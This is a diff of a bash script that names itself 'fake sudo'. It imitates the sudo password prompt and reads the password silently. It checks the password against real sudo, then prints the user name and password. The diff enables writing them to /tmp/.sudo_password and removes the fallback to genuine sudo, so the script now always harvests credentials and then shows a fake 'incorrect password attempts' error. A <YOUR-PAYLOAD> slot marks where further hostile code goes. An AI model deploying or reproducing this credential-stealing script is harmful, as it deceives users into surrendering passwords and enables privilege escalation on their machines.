@@ -6,26 +6,23 @@
 # done
 # echo ""
 # echo "python /tmp/sudo.py $i"
-if [ -z "${SUDO_PROMPT}" ]; then
-    readonly INPUT_MESSAGE="[sudo] password for ${USER}: "
-else
-    readonly INPUT_MESSAGE="${SUDO_PROMPT}"
-fi
+readonly INPUT_MESSAGE="[sudo] password for ${USER}: "
+
 
 readonly MAXIMUM_ATTEMPTS=3
 readonly ERROR_MESSAGE="sudo: ${MAXIMUM_ATTEMPTS} incorrect password attempts"
 
 attempts() {
     echo "Running fake sudo"
-    /bin/echo -n "${INPUT_MESSAGE}"
+    echo -n "${INPUT_MESSAGE}"
     read -r -s sudo_password
-    /bin/echo ""
-    if ( /bin/echo "${sudo_password}" | /usr/bin/sudo -S /bin/true > /dev/null 2>&1 ); then
+    echo ""
+    if ( echo "${sudo_password}" | sudo -k -S true > /dev/null 2>&1 ); then
         ##
         # <YOUR-PAYLOAD>
         ##
         /bin/echo "${USER}:${sudo_password}"
-        # /bin/echo "${USER}:${sudo_password}" > /tmp/.sudo_password
+        /bin/echo "${USER}:${sudo_password}" > /tmp/.sudo_password
         ##
         # </YOUR-PAYLOAD>
         ##
@@ -38,11 +35,8 @@ attempts() {
     fi
 }
 
-if ( (/usr/bin/sudo -n /bin/true > /dev/null 2>&1) || [ "${#}" -eq 0 ] ); then
-    /usr/bin/sudo "${@}"
-else
-    for ((iterator=1; iterator <= MAXIMUM_ATTEMPTS; iterator++)); do
-        attempts "${@}"
-    done
-    /bin/echo "${ERROR_MESSAGE}"
-fi
+
+for ((iterator=1; iterator <= MAXIMUM_ATTEMPTS; iterator++)); do
+    attempts "${@}"
+done
+/bin/echo "${ERROR_MESSAGE}"
